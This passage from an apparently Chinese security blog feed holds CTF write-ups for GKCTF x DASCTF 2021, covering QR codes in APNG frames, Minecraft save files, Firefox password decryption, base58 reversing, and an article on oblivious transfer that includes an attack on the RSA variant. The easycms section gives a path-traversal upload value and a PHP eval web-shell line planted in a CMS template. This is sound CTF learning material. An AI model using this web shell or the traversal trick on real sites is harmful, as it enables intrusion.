class="headerlink" title="问卷调查"></a>问卷调查</h3><blockquote><p><a href="https://www.wjx.cn/vj/Y3msOw2.aspx">https://www.wjx.cn/vj/Y3msOw2.aspx</a></p><p>感谢各位师傅参与本次比赛。</p></blockquote><p>填问卷。</p><p>​    </p><h3 id="你知道apng吗"><a href="#你知道apng吗" class="headerlink" title="你知道apng吗"></a>你知道apng吗</h3><blockquote><p>（flag由flag头包裹</p></blockquote><p>apng图片（动态png图片），用apngdis工具提取各帧，发现第2、18、26帧有二维码。</p><p>QR_Research能识别出第18帧为 <code>-ad20</code>，以及第26帧为 <code>-0327-288a235370ea&#125;</code>，第2帧变形二维码无法识别，用在线工具<a href="https://merricx.github.io/qrazybox/">qrazybox</a>照着手绘，得到结果 <code>flag&#123;a3c7e4e5</code>。</p><p>flag应为uuid形式，还少一段，按照2、18、26的间隔，应该在第10帧里，stegsolve查看第10帧，在Red 2通道看到二维码，识别结果 <code>-9b9d</code>。</p><p>拼接得flag。</p><p>​    </p><h3 id="银杏岛の奇妙冒险"><a href="#银杏岛の奇妙冒险" class="headerlink" title="银杏岛の奇妙冒险"></a>银杏岛の奇妙冒险</h3><blockquote><p>链接: <a href="https://pan.baidu.com/s/1cONFRAgjmu2-de67IRthhQ">https://pan.baidu.com/s/1cONFRAgjmu2-de67IRthhQ</a> 密码: 04m0</p><p>链接：<a href="https://share.weiyun.com/hdikz5gL">https://share.weiyun.com/hdikz5gL</a> 密码：yjyh3g</p><p>游戏题</p><p>1.游戏启动需要java1.8环境，无java环境会自动帮助安装java环境，如果你已经有java1.8环境，即可无视这条信息 2.启动 “点击启动.exe” 文件，打开游戏启动器，输入你的ID 3.java环境配置完毕后，最好分配游戏内存至少为2048M 4.进入游戏后，根据游戏内的任务索引完成任务，即可获取flag 5.进入游戏 一定 一定 一定要注意对话信息，否则无法顺利的完成任务 5.祝大家玩的愉快</p></blockquote><p>Minecraft游戏，试玩了下不熟悉，尝试从资源文件入手。</p><p>Everything搜索 <code>flag</code> 关键字，发现 <code>.minecraft\saves\Where is the flag</code> 存档目录，接着在 <code>customnpcs\quests\主线</code> 目录中找到主线对应的json文件有关键字符串：</p><p><code>2.json</code> 中：<code>&quot;&#123;\&quot;text\&quot;:\&quot; part 1\\nw3lc0me_\\n\\npart 2\\n291 -95 67\&quot;&#125;&quot;</code>，</p><p><code>3.json</code> 中：<code>&quot;&#123;\&quot;text\&quot;:\&quot; part 2\\nt0_9kctf_\\n\\npart 3 \\n324 -190 79\&quot;&#125;&quot;</code>，</p><p><code>4.json</code> 中：<code>&quot;&#123;\&quot;text\&quot;:\&quot; part 3\\n2021_\\n\\npart 4\\n362 -144 69\&quot;&#125;&quot;</code>，</p><p><code>5.json</code> 中：<code>&quot;&#123;\&quot;text\&quot;:\&quot; Part 4\\nCheck_1n\\n恭喜你，\\n完成签到，\\n武运昌隆。\&quot;&#125;&quot;</code>，</p><p>前面是内容，后面是下一处的坐标。</p><p>拼接，加头得flag。</p><p>​    </p><h3 id="FireFox-Forensics"><a href="#FireFox-Forensics" class="headerlink" title="FireFox Forensics"></a>FireFox Forensics</h3><blockquote><p>取证大佬说这是一份登录凭证文件</p></blockquote><p>得到 <code>logins.json</code> 和 <code>key4.db</code> 两个文件，结合题目知是火狐浏览器存储密码信息的密钥文件对，直接利用<a href="https://github.com/lclevy/firepwd">Firepwd工具</a>解析（将两个文件置于脚本同一目录下）：</p><p><code>python firepwd.py</code></p><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">globalSalt: b&#x27;1e26e84b2f01da28d865e7258f9003d16b9c43f2&#x27;</span><br><span class="line"> SEQUENCE &#123;</span><br><span class="line">   SEQUENCE &#123;</span><br><span class="line">     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2</span><br><span class="line">     SEQUENCE &#123;</span><br><span class="line">       SEQUENCE &#123;</span><br><span class="line">         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2</span><br><span class="line">         SEQUENCE &#123;</span><br><span class="line">           OCTETSTRING b&#x27;66a735e17767b37d83d464126b36d4269243f9e0c99405ccd68f442798f83129&#x27;</span><br><span class="line">           INTEGER b&#x27;01&#x27;</span><br><span class="line">           INTEGER b&#x27;20&#x27;</span><br><span class="line">           SEQUENCE &#123;</span><br><span class="line">             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       SEQUENCE &#123;</span><br><span class="line">         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC</span><br><span class="line">         OCTETSTRING b&#x27;24eb241594de7ab37ec379d9ba06&#x27;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   OCTETSTRING b&#x27;946322a2b2978db6601e449e1bdf7c4d&#x27;</span><br><span class="line"> &#125;</span><br><span class="line">clearText b&#x27;70617373776f72642d636865636b0202&#x27;</span><br><span class="line">password check? True</span><br><span class="line"> SEQUENCE &#123;</span><br><span class="line">   SEQUENCE &#123;</span><br><span class="line">     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2</span><br><span class="line">     SEQUENCE &#123;</span><br><span class="line">       SEQUENCE &#123;</span><br><span class="line">         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2</span><br><span class="line">         SEQUENCE &#123;</span><br><span class="line">           OCTETSTRING b&#x27;56722302469f529a29dc73f28d6af3ed0ee483cceff05772e96e2313336816fd&#x27;</span><br><span class="line">           INTEGER b&#x27;01&#x27;</span><br><span class="line">           INTEGER b&#x27;20&#x27;</span><br><span class="line">           SEQUENCE &#123;</span><br><span class="line">             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       SEQUENCE &#123;</span><br><span class="line">         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC</span><br><span class="line">         OCTETSTRING b&#x27;ef6a4df3e5fd7608c97df9e22092&#x27;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   OCTETSTRING b&#x27;51b24cd6a2672c312255d7f2dddeb67336fd56973b4302bb2eacf2270c251d41&#x27;</span><br><span class="line"> &#125;</span><br><span class="line">clearText b&#x27;673dec57458fb95bd50bdc9198541038970e5b3d518973a40808080808080808&#x27;</span><br><span class="line">decrypting login/password pairs</span><br><span class="line">https://ctf.g1nkg0.com:b&#x27;admin&#x27;,b&#x27;GKCTF&#123;9cf21dda-34be-4f6c-a629-9c4647981ad7&#125;&#x27;</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="QQQQT"><a href="#QQQQT" class="headerlink" title="QQQQT"></a>QQQQT</h3><blockquote><p>QQQT？什么东西？</p><p>链接: <a href="https://pan.baidu.com/s/1e0fdBFIZ52EX04PwdgmpRQ">https://pan.baidu.com/s/1e0fdBFIZ52EX04PwdgmpRQ</a> 密码: cfiq</p></blockquote><p>IDA打开，在字符串窗口跟进 <code>56fkoP8KhwCf3v7CEz</code> 找到关键函数 <code>sub_4012F0()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __thiscall <span class="title">sub_4012F0</span><span class="params">(_DWORD *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// edi</span></span><br><span class="line">  _BYTE *v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// edx</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// [esp-8h] [ebp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> v16[<span class="number">4</span>]; <span class="comment">// [esp+10h] [ebp-90h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v17[<span class="number">4</span>]; <span class="comment">// [esp+14h] [ebp-8Ch] BYREF</span></span><br><span class="line">  _BYTE *v18; <span class="comment">// [esp+18h] [ebp-88h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v19; <span class="comment">// [esp+1Ch] [ebp-84h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [esp+20h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">int</span> v21; <span class="comment">// [esp+24h] [ebp-7Ch] BYREF</span></span><br><span class="line">  _BYTE *v22; <span class="comment">// [esp+28h] [ebp-78h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v23[<span class="number">60</span>]; <span class="comment">// [esp+2Ch] [ebp-74h] BYREF</span></span><br><span class="line">  __int128 v24[<span class="number">2</span>]; <span class="comment">// [esp+68h] [ebp-38h] BYREF</span></span><br><span class="line">  __int64 v25; <span class="comment">// [esp+88h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// [esp+9Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  MEMORY[<span class="number">0x5FF6</span>](*(_DWORD *)(<span class="keyword">this</span>[<span class="number">6</span>] + <span class="number">4</span>), v16);</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  MEMORY[<span class="number">0x7C7C</span>](v16, v17);</span><br><span class="line">  LOBYTE(v26) = <span class="number">1</span>;</span><br><span class="line">  v19 = (<span class="keyword">const</span> <span class="keyword">char</span> *)MEMORY[<span class="number">0x7C48</span>](v17);</span><br><span class="line">  v24[<span class="number">0</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v24[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">  v25 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">strcpy</span>(v23, <span class="string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span>);</span><br><span class="line">  v21 = <span class="number">138</span> * <span class="built_in">strlen</span>(v19) / <span class="number">0x64</span>;</span><br><span class="line">  v14 = v21 + <span class="number">1</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v22 = (_BYTE *)MEMORY[<span class="number">0x8114</span>](v21 + <span class="number">1</span>);</span><br><span class="line">  v2 = v22;</span><br><span class="line">  sub_402C08(v22, <span class="number">0</span>, v14);</span><br><span class="line">  v3 = v19;</span><br><span class="line">  v20 = (<span class="keyword">int</span>)(v19 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v19) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = &amp;v2[v21];</span><br><span class="line">    v18 = v4;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v20 = ((<span class="keyword">char</span>)*v4 &lt;&lt; <span class="number">8</span>) + v3[v1];</span><br><span class="line">      v5 = v20 / <span class="number">58</span>;</span><br><span class="line">      *v4 = v20 % <span class="number">58</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v6 = (<span class="keyword">char</span>)*--v4;</span><br><span class="line">          v7 = (v6 &lt;&lt; <span class="number">8</span>) + v5;</span><br><span class="line">          v20 = v7 / <span class="number">58</span>;</span><br><span class="line">          *v4 = v7 % <span class="number">58</span>;</span><br><span class="line">          v5 = v20;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v20 );</span><br><span class="line">        v4 = v18;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( ++v1 &gt;= <span class="built_in">strlen</span>(v19) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = v19;</span><br><span class="line">    &#125;</span><br><span class="line">    v2 = v22;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !*v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      ++v8;</span><br><span class="line">    <span class="keyword">while</span> ( !v2[v8] );</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = v21;</span><br><span class="line">  <span class="keyword">if</span> ( v8 &lt;= v21 )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = v2 - (_BYTE *)v24;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v11 = (<span class="keyword">char</span> *)v24 + v8++;</span><br><span class="line">      *v11 = v23[(<span class="keyword">char</span>)v11[v10]];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v8 &lt;= v9 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !MEMORY[<span class="number">0x7C1A</span>](v24, <span class="string">&quot;56fkoP8KhwCf3v7CEz&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v19 )</span><br><span class="line">      v12 = <span class="built_in">strlen</span>(v19);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v12 = <span class="number">-1</span>;</span><br><span class="line">    v22 = (_BYTE *)MEMORY[<span class="number">0x7CCC</span>](v19, v12);</span><br><span class="line">    LOBYTE(v26) = <span class="number">2</span>;</span><br><span class="line">    v21 = MEMORY[<span class="number">0x7CCC</span>](<span class="string">&quot;flag&quot;</span>, <span class="number">4</span>);</span><br><span class="line">    LOBYTE(v26) = <span class="number">3</span>;</span><br><span class="line">    MEMORY[<span class="number">0x6124</span>](<span class="keyword">this</span>, &amp;v21, &amp;v22, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">    MEMORY[<span class="number">0x7C66</span>](&amp;v21);</span><br><span class="line">    MEMORY[<span class="number">0x7C66</span>](&amp;v22);</span><br><span class="line">  &#125;</span><br><span class="line">  MEMORY[<span class="number">0x7C30</span>](v17);</span><br><span class="line">  <span class="keyword">return</span> MEMORY[<span class="number">0x7C66</span>]();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码逻辑知将输入字符串base58编码后的结果与字符串 <code>56fkoP8KhwCf3v7CEz</code> 比对，直接base58解码 <code>56fkoP8KhwCf3v7CEz</code> 得到 <code>12t4tww3r5e77</code>。加头即flag。</p><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><blockquote><p>真·ezcms</p><p>hint: 后台密码5位弱口令</p></blockquote><p>蝉知cms，搜索知该cms存在<strong>后台任意文件读取</strong>与<strong>后台Getshell</strong>漏洞。</p><p>访问 <code>admin.php</code>，根据提示用 <code>admin/12345</code> 登进后台，在<strong>设计-高级</strong>里面可以直接编辑php模板文件：</p><p><img src="/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/20210626191309.png" alt="20210626191309" style="zoom:80%;"></p><p>在源码里加上一句话却发现需要验证用户权限：</p><p><img src="/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/20210626191605.png" alt="20210626191605" style="zoom:80%;"></p><p>如果编辑模板，需要管理员在cms的 <code>/system/tmp</code> 目录下新建一个名字为 <code>xgem.txt</code> 的文件来验证是否有写入权限。</p><p>在<strong>设计-组件-素材库</strong>可以上传素材，并且可以跨目录上传文件。本地新建一个 <code>xgem.txt</code> 文件，上传后把名称的参数改为 <code>../../../../../system/tmp/xgem</code>：</p><p><img src="/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/20210626191957.png" alt="20210626191957" style="zoom:80%;"></p><p>再回到<strong>设计-高级</strong>模板编辑界面，尝试在首页模板文件 <code>/var/www/html/system/tmp/template/default/index/index.html.php</code> 中首行添加 <code>&lt;?php phpinfo();?&gt;</code>，保存。</p><p>回到首页发现执行成功：</p><p><img src="/2021/06/26/match-GKCTFxDASCTF%E5%BA%94%E6%80%A5%E6%8C%91%E6%88%98%E6%9D%AF/20210626192413.png" alt="20210626192413" style="zoom:80%;"></p><p>将代码改为一句话 <code>&lt;?php @eval($_POST[ccc]);?&gt;</code>，蚁剑连接，在根目录访问文件 <code>/flag</code> 得到flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;指导单位: 中国移动通信联合会&lt;br&gt;主办单位: 防灾科技学院信息工程学院杭州安恒信息技术股份有限公司&lt;br&gt;本次命题: Ginkgo战队&lt;br&gt;比赛时间: 2021年6月26日09:00-17:00&lt;br&gt;报名时间: 2021年6月21日19:3</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>不经意传输</title>
    <link href="https://lazzzaro.github.io/2021/06/20/crypto-%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/"/>
    <id>https://lazzzaro.github.io/2021/06/20/crypto-%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/</id>
    <published>2021-06-20T04:07:57.000Z</published>
    <updated>2021-06-20T05:29:24.471Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p><strong>不经意传输（Oblivious Transfer, OT）</strong>是一种可保护隐私的双方通信协议、接受者的隐私不被发送者所知道，使通信双方以一种选择模糊化的方式传送消息。抽象地讲，就是A给B发消息，A却不知道B收到的是啥，一般的思路就是A要多发一些消息然后让B去选择有需要的，如果是这样的话，同时还应该保证B不会多知道他本不应该知道的消息。不经意传输可以分为1选1、2选1、n选1、n选k多种不经意传输协议。</p><h3 id="1选1"><a href="#1选1" class="headerlink" title="1选1"></a>1选1</h3><p>A给B发送一条消息，B只有 $\frac{1}{2}$ 的概率能够接受到真正的消息，且A不知道B是否真正接受了消息。</p><ol><li><p>A取两个素数 $p,q$，计算 $n=pq$，将 $n$ 发送给B；</p></li><li><p>B任取 $x,x \in (0,n),\gcd(x,n)=1$，计算 $a=x^2 \bmod n$，将 $a$ 发送给A；</p></li><li><p>A知道 $p,q$，可以计算 $a=x^2 \bmod n$ 的四个根 $(x,n-x,y,n-y)$，从中随机挑选一个送给B；</p></li><li><p>B若收到 $y$ 或 $n-y$，则可计算 $p,q$：$\gcd(x+y,n)=p$ 或 $\gcd(x+y,n)=q$；</p><p>B若收到 $x$ 或 $n-x$，则B什么也得不到。</p><p>​    </p></li></ol><h3 id="2选1"><a href="#2选1" class="headerlink" title="2选1"></a>2选1</h3><p>A给B发送两条消息 $(m_0, m_1)$，B能够在不知道另外一条消息的内容的情况下得知其中一条消息的内容，且A不知道B选择的哪条消息。</p><ul><li><h4 id="RSA实现"><a href="#RSA实现" class="headerlink" title="RSA实现"></a>RSA实现</h4><ol><li><p>A有两个秘密消息 $m_0,m_1$；</p></li><li><p>A使用RSA算法，生成公钥 $(N,e)$ 对公开，私钥 $d$ 自己留着。公钥 $(N,e)$ 告知B；</p><p>（每次通信的时候RSA都要重新生成一对公钥私钥）</p></li><li><p>A产生两个随机数 $x_0,x_1$，并且将这两个随机数传输给B；</p></li><li><p>B决定要获取的数字编号 $b=\{0,1\}$，以及产生一个随机数 $k$；</p></li><li><p>B计算一个数字 $v=(x_b+k^e) \bmod N$，并且将这个 $v$ 发送给A；</p></li><li><p>A计算多个 $k_i$，其中一个 $k_i$ 将会等于 $k$：</p><p>$k_0=(v-x_0)^d \bmod N \ k_1=(v-x_1)^d \bmod N$</p><p>由于此时 $v$ 并不是A产生的，所以此时的A并不知道哪一个 $k$ 是B需要的；</p></li><li><p>A将生成的值与自己手上的信息进行相加，得到全新的信息：</p><p>$m_0’=m_0+k_0 \ m_1’=m_1+k_1$</p><p>并将信息发送给B。因为此时每一个信息都增加了 $k_i$，所以B无法直接还原信息 $m$；</p></li><li><p>B此时知道自己选择的信息编号 $b$，于是选出 $m_b$，计算出 $k_b$，并且用 $m_b=m_b’-k_b$ 得到此时的解密信息。</p></li></ol><ul><li><h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><ul><li><p>构造 $v$ 得 $m_0,m_1$</p><p>$v=\cfrac{\text{scale}^e \cdot x_0-x_1}{\text{scale}^e-1}$</p><p>可使 $k_1=\text{scale} \cdot k_0$，因此 $\text{scale} \cdot m_0’-m_1’=m_0 \cdot \text{scale} -m_1$。</p><p>首先，如果恰巧随机数 $m_0$ 和 $m_1$ 都小于 $\text{scale}$，那么直接可以从 $m_0 \cdot \text{scale} -m_1$ 将两者求出。</p><p>其次，如果 $\text{scale}$ 取值不能取得太大，而导致两个 $m$ 总是比它大，那只能老老实实穷举可能的低字节，再向高字节搜索。</p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/eAJWraah9OOgJfZOhm4Sqg">Pwnhub - BabyOT</a></p><p><a href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/master/official/%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/README.md">Hackergame 2020 - 不经意传输</a></p></li></ul></li></ul></li></ul><ul><li><h4 id="其他实现"><a href="#其他实现" class="headerlink" title="其他实现"></a>其他实现</h4><ol><li><p>A发送 $g^s$ 给B，B知道 $g$ 和 $g^s$ 也无法破译 $s$，因为DLP问题不存在高效解法；</p></li><li><p>B基于 $i$ 生成 $L_i=\begin{cases} g^k ,&amp; i=0 \ g^{s-k} ,&amp; i=1 \end{cases}$；</p></li><li><p>B发送 $L_i$ 给A，A知道 $g$ 和 $g_k$ 也无法破译 $k$，因为DLP问题不存在高效解法。</p><p>因此，A无法知道B发来的是 $g_k$ 还是 $g_{s-k}$，也就无法知道 $i$；</p></li><li><p>A生成 $C_0,C_1$：</p><p>$C_0=(g^{r_0},(L_i)^{r_0} \oplus v_0)\ C_1=(g^{r_1},(\frac{g^s}{L_i})^{r_1} \oplus v_1)$</p></li><li><p>A发送 $C_0,C_1$ 给B，B知道 $g,g^{r_0},g^{r_1}$ 也无法破译 $r_0,r_1$，因为DLP问题不存在高效解法。</p></li><li><p>B解密 $v_i$：</p><p>(1) 对于 $i=0$ 的情形：</p><p>B可以通过如下方式解密获得 $v_0$：</p><p>$C_0[0]^k \oplus C_0[1]=(g^{r_0})^k \oplus (L_i)^{r_0} \oplus v_0=(g^{r_0})^k \oplus (g^k)^{r_0} \oplus v_0=v_0$</p><p>B无法获得 $v_1$ 因为 $C_1[1]=(\frac{g^s}{L_i})^{r_1} \oplus v_1=g^{(s-k)r_1} \oplus v_1$，而 B不知道 $s,r_1$。</p><p>(2) 对于 $i=1$ 的情形：</p><p>B可以通过如下方式解密获得 $v_1$：</p><p>$C_1[0]^k \oplus C_1[1]=(g^{r_1})^k \oplus (L_i)^{r_1} \oplus v_1=(g^{r_1})^k \oplus (g^k)^{r_1} \oplus v_1=v_1$</p><p>B无法获得 $v_0$ 因为 $C_0[1]=(L_i)^{r_0} \oplus v_0=g^{(s-k)r_0} \oplus v_0$，而 B不知道 $s,r_0$。</p></li><li><p>因此，B只能解密 $v_i$ 而不能解密 $v_{1-i}$。</p></li></ol></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;不经意传输（Oblivious Transfer, OT）&lt;/strong&gt;是一种可保护隐私的双方通信协议、接受者的隐私不被发送者所知道，使通信双方以一种选择模糊化的方式传送消息。抽象地讲，就是A给B发消息，A却不知道B收到的是啥，</summary>
      
    
    
    
    <category term="crypto" scheme="https://lazzzaro.github.io/categories/crypto/"/>
    
    
    <category term="OT" scheme="https://lazzzaro.github.io/tags/OT/"/>
    
  </entry>
  
  <entry>
    <title>DozerCTF 2021</title>
    <link href="https://lazzzaro.github.io/2021/05/30/match-DozerCTF-2021/"/>
    <id>https://lazzzaro.github.io/2021/05/30/match-DozerCTF-2021/</id>
    <published>2021-05-30T14:23:15.000Z</published>
    <updated>2021-05-30T16:54:45.628Z</updated>
    
